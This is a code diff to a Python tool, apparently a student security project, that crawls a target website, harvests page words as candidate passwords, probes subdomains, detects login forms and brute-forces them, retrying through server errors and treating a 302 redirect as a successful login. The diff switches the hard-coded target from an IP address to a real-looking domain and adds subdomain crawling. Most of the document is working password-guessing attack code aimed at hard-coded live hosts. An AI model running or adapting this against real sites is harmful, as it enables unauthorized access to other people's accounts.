@@ -30,11 +30,17 @@ def add_duplicate_url(url, seen):
         seen.add(url + '/')       
 
 def process_node(start_url, node, header_dict, forms, keywords, seen, add_next, counter):
+    if counter.count >= counter.page_max:
+        print('Crawling aborted: The maximum number of pages of ' + str(counter.page_max) + ' has been reached!')
+        return
+
     print('Depth ' + str(node.depth) + ': Processing: ' + node.url)
     
     # Make GET request to the current URL      
     html_doc = get_request(node.url, header_dict)
     if html_doc is not None:
+        counter.count += 1
+
         parser = HTMLParser(html_doc)
 
         # Extract and add words from current page to the set of keywords
@@ -44,10 +50,6 @@ def process_node(start_url, node, header_dict, forms, keywords, seen, add_next, 
         form_found = parser.detect_login_form()
         if form_found:
             forms.add(node.url)
-
-        counter.count += 1
-        if counter.count >= counter.page_max:
-            return
 
         # Add reachable URLs from current node if its depth < max depth
         if node.depth < counter.max_depth:
@@ -129,16 +131,17 @@ def get_subdomains(url):
 
     return {subdomain + '.' + host for subdomain in subdomains}
 
-def crawl_subdomains(bfs, url, header_dict):
+def crawl_subdomains(bfs, url, header_dict, counter):
     for subdomain in get_subdomains(url):
         try:
             conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             # Test whether subdomain exists 
             conn.connect((subdomain, 80))
+            subdomain = reformat_url(subdomain)
             if bfs:
-                crawl_bfs(subdomain, header_dict)
+                crawl_bfs(subdomain, header_dict, counter)
             else:
-                crawl_dfs(subdomain, header_dict)            
+                crawl_dfs(subdomain, header_dict, counter)            
         except socket.gaierror:
             print('Subdomain ' + subdomain + ' was not found.')
         finally:
@@ -170,7 +173,9 @@ def brute_force(user, keywords, forms, user_agent):
             # Continually retry logging in if there is a server error (too many failed attempts)
             while get_status(response) >= 500:
                 response = post_request(form, post, login)
+
             print('Attempting to login...\nUser: ' + user + '\nPassword: ' + password)
+
             if get_status(response) == 302:
                 print('Login Succeeded!\n')
                 break
@@ -179,40 +184,12 @@ def brute_force(user, keywords, forms, user_agent):
         
         print('Ran out of passwords! Bruteforce failed!')
           
-def main(username, maxdepth, maxpage, mode):
-    
-    url = 'http://3.16.219.26/'
-    url = reformat_url(url)
-    page_counter = Counter(0, maxdepth, maxpage)
-
-
-    if mode == 'bfs':
-        """
-        BFS
-        """
-        keywords, forms, seen = crawl_bfs(url, {}, page_counter)
-        print('\n\nKeywords:', keywords, '\n\nForm:', forms, '\n\nSeen:', seen, sep=' ')
-        brute_force(username, keywords, forms, '')
-    elif mode == 'dfs':
-        """
-        DFS
-        """
-        keywords, forms, seen = crawl_dfs(url, {}, page_counter)
-        print('\n\nKeywords:', keywords, '\n\nForm:', forms, '\n\nSeen:', seen, sep=' ')
-        brute_force(username, keywords, forms, '')
-    else:
-        print('\'{}\' is not supported as a search algorithm. Please use \'bfs\' or \'dfs\'!'.format(search_algo))
-        return
-
-    print('\n\n\n', get_subdomains(url))
-
-
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description= 'Arguments to proceed web-crawling')
-    parser.add_argument('--u', nargs = 1, type = str, help = 'USERNAME')
-    parser.add_argument('--maxdepth', nargs = 1, type = int, help = 'MAX DEPTH TO CRAWL')
-    parser.add_argument('--maxpages', nargs = 1, type = int, help = 'MAX PAGES TO CRAWL')
-    parser.add_argument('--mode', nargs = 1, type = str, help='MODE OF CRAWLING : \'bfs\' OR \'dfs\'')
+def main():
+    parser = argparse.ArgumentParser(description='Arguments to proceed web-crawling')
+    parser.add_argument('--u', nargs=1, type=str, help='USERNAME')
+    parser.add_argument('--maxdepth', nargs=1, type=int, help='MAX DEPTH TO CRAWL')
+    parser.add_argument('--maxpages', nargs=1, type=int, help='MAX PAGES TO CRAWL')
+    parser.add_argument('--mode', nargs=1, type=str, help='MODE OF CRAWLING : \'bfs\' OR \'dfs\'')
     args = parser.parse_args()
     username, mode = '',''
     maxdepth, maxpage = 0,0
@@ -232,6 +209,34 @@ if __name__ == '__main__':
         mode = 'bfs'
     else :
         mode = args.mode.pop()
-    main(username, maxdepth, maxpage, mode)
+
+    url = 'http://stonybrook.be'
+    url = reformat_url(url)
+    page_counter = Counter(0, maxdepth, maxpage)
+
+
+    if mode == 'bfs':
+        """
+        BFS
+        """
+        keywords, forms, seen = crawl_bfs(url, {}, page_counter)
+        print('\n\nKeywords:', keywords, '\n\nForm:', forms, '\n\nSeen:', seen, sep=' ')
+        crawl_subdomains(True, url, {}, page_counter)
+        brute_force(username, keywords, forms, '')
+    elif mode == 'dfs':
+        """
+        DFS
+        """
+        keywords, forms, seen = crawl_dfs(url, {}, page_counter)
+        print('\n\nKeywords:', keywords, '\n\nForm:', forms, '\n\nSeen:', seen, sep=' ')
+        brute_force(username, keywords, forms, '')
+    else:
+        print('\'{}\' is not supported as a search algorithm. Please use \'bfs\' or \'dfs\'!'.format(search_algo))
+        return
+
+    print('\n\n\n', get_subdomains(url))
+
+if __name__ == '__main__':
+    main()
 
     
